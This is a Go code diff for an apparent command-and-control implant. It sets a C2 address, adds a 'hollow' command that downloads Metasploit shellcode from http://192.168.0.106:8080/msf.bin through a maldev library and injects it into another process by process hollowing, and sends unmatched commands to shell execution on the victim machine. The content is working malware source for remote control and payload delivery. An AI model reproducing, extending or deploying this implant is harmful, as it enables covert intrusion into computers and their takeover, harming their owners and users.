@@ -9,7 +9,8 @@ import (
 	"strings"
 	"syscall"
 	"time"
-	//"github.com/D3Ext/maldev/shellcode"
+
+	"github.com/D3Ext/maldev/shellcode"
 	// "github.com/faiface/beep"
 	// "github.com/faiface/beep/mp3"
 	// "github.com/faiface/beep/speaker"
@@ -155,7 +156,7 @@ func ls(conn *net.Conn, implantWD *string) {
 // }
 
 func main() {
-	c2Address := "192.168.0.106:4444"
+	c2Address := "192.168.0.106:5555"
 	attempts := 0
 	implantWD, _ := os.Getwd()
 	fmt.Println("Implant Started")
@@ -211,13 +212,6 @@ func main() {
 			}
 		case "hollow\n":
 			{
-				//Ez way
-				// sc, err := shellcode.GetShellcodeFromUrl("http://192.168.0.106:80/msf.bin")
-				// if err != nil {
-				// 	fmt.Println("Couldn't get shellcode")
-				// 	return
-				// }
-
 				//Hardcore method below
 				conn.Write([]byte("OK\n"))
 				//Check if the file even exists
@@ -245,49 +239,28 @@ func main() {
 				}
 				conn.Write([]byte("OK\n"))
 				fmt.Println("The file exists and is readable: " + filePath)
-
-				//Create a buffer to recieve the shellcode and fire it
-				read_len, err = conn.Read(buffer)
+				// Ez way
+				sc, err := shellcode.GetShellcodeFromUrl("http://192.168.0.106:8080/msf.bin")
 				if err != nil {
-					fmt.Println("Problem Reading the buffer")
-					conn.Write([]byte("Return"))
+					fmt.Println("Couldn't get shellcode")
 					return
 				}
-				if read_len <= 1 {
-					fmt.Println("Problem with Buffer Size")
-					conn.Write([]byte("Return"))
-					return
-				}
-				sc := buffer[:read_len]
-				conn.Write([]byte("OK\n"))
-				fmt.Println("Shellcode Recieved Commencing Hollowing")
+				// //Create a buffer to recieve the shellcode and fire it
+				// read_len, err = conn.Read(buffer)
+				// if err != nil {
+				// 	fmt.Println("Problem Reading the buffer")
+				// 	conn.Write([]byte("Return"))
+				// 	return
+				// }
+				// if read_len <= 1 {
+				// 	fmt.Println("Problem with Buffer Size")
+				// 	conn.Write([]byte("Return"))
+				// 	return
+				// }
+				// sc := buffer[:read_len]
+				// conn.Write([]byte("OK\n"))
+				// fmt.Println("Shellcode Recieved Commencing Hollowing")
 				hollow(&conn, sc, filePath)
-			}
-		case "check\n":
-			{
-				//fileLocal := "C:\\Program Files\\Internet Explorer\\iexplore.exe" //Works
-				conn.Write([]byte("OK\n"))
-				buffer := make([]byte, 100000)
-				read_len, err := conn.Read(buffer)
-				if err != nil {
-					fmt.Println("Problem Reading the buffer")
-					conn.Write([]byte("Return"))
-					return
-				}
-				if read_len <= 1 {
-					fmt.Println("Problem with Buffer Size")
-					conn.Write([]byte("Return"))
-					return
-				}
-				bufferSnapped := buffer[:read_len]
-				fileLocal := string(bufferSnapped)
-				fmt.Println("Done with the buffer stuff checking if file exists ...")
-				_, err = os.Stat(fileLocal)
-				if err != nil {
-					fmt.Println("File dont exist")
-					return
-				}
-				fmt.Println("File Exists !!!")
 			}
 		default: //TO-DO: turning the default into an error statement and appending all shell commands with a ">.<" to avoid crashes
 			executeCommands(&conn, &command)
